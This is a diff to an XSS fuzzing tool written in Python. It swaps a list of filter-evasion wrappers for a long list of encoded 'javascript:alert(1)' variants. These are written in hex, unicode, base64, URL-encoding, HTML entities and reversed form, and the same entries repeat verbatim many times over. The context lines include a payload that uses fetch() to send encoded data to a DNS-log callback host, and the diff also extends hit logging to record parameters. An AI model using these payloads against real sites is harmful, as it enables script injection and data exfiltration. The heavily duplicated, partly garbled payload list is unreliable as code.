@@ -297,12 +297,108 @@ if DNSLOG_DOMAIN:
     PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('MASK'))>")
 
 FILTER = [
-    "<sCrIpT>PAYLOAD</sCrIpT>",
-    "<!-->PAYLOAD<!-->",
-    "<object data=\"javascript:PAYLOAD\"></object>",
-    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">",
-    "<div style=width:expression(PAYLOAD)></div>"
+    'javascript:alert(1)',
+    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
+    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
+    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
+    'javascript%3Aalert%281%29',
+    'javascript%253Aalert%25281%2529',
+    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
+    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
+    ')1(trela:tpircsavaj',
+    'JAVASCRIPT:ALERT(1)',
+    'javascript:alert(1)',
+    'JAVASCRIPT:ALERT(1)',
+    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    'amF2YXNjcmlwdDphbGVydCgxKQ',
+    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
+    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
+    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
+    'javascript:alert(I)',
+    'javascript:alert(1)',
+    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
+    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
+    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
+    'javascript%3Aalert%281%29',
+    'javascript%253Aalert%25281%2529',
+    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
+    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
+    ')1(trela:tpircsavaj',
+    'JAVASCRIPT:ALERT(1)',
+    'javascript:alert(1)',
+    'JAVASCRIPT:ALERT(1)',
+    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    'amF2YXNjcmlwdDphbGVydCgxKQ',
+    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
+    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
+    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
+    'javascript:alert(I)',
+    'javascript:alert(1)',
+    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
+    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
+    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
+    'javascript%3Aalert%281%29',
+    'javascript%253Aalert%25281%2529',
+    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
+    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
+    ')1(trela:tpircsavaj',
+    'JAVASCRIPT:ALERT(1)',
+    'javascript:alert(1)',
+    'JAVASCRIPT:ALERT(1)',
+    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    'amF2YXNjcmlwdDphbGVydCgxKQ',
+    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
+    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
+    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
+    'javascript:alert(I)',
+    'javascript:alert(1)',
+    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
+    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
+    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
+    'javascript%3Aalert%281%29',
+    'javascript%253Aalert%25281%2529',
+    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
+    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
+    ')1(trela:tpircsavaj',
+    'JAVASCRIPT:ALERT(1)',
+    'javascript:alert(1)',
+    'JAVASCRIPT:ALERT(1)',
+    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    'amF2YXNjcmlwdDphbGVydCgxKQ',
+    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
+    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
+    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
+    'javascript:alert(I)',
+    'javascript:alert(1)',
+    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
+    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
+    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
+    'javascript%3Aalert%281%29',
+    'javascript%253Aalert%25281%2529',
+    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
+    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
+    ')1(trela:tpircsavaj',
+    'JAVASCRIPT:ALERT(1)',
+    'javascript:alert(1)',
+    'JAVASCRIPT:ALERT(1)',
+    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
+    'amF2YXNjcmlwdDphbGVydCgxKQ==',
 ]
+
 
 # ─── JSFLAG: In-browser sink tracer ─────────────────────────────────────────
 JSFLAG = """
@@ -345,14 +441,16 @@ if not LOGFILE.exists():
 _hits = set()
 log_lock = threading.Lock()
 
-def log_hit(url: str, method: str, payload: str):
-    entry = f"- **XSS** {method} `{url}` payload=`{payload[:90]}`\n"
+def log_hit(url: str, method: str, payload: str, params: List[str]):
+    param_str = ", ".join(params)
+    entry = f"- **XSS** {method} `{url}` param=`{param_str}` payload=`{payload[:90]}`\n"
     with log_lock:
         if entry in _hits:
             return
         _hits.add(entry)
         LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
     logging.info(entry.strip())
+
 
 # ─── VERIFICATION ─────────────────────────────────────────────────────────
 def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
@@ -787,7 +885,7 @@ def fuzz_http(t: Dict[str,Any]) -> None:
                     jitter(10, 30)
                     return
                 if reflected(pay, r2.text) or verify(url, method, dat if not is_json else body, is_json):
-                    log_hit(url, method, pay)
+                    log_hit(url, method, pay, t["params"])
                     return
             except Exception as e:
                 dbg(f"[fuzz] {e}")
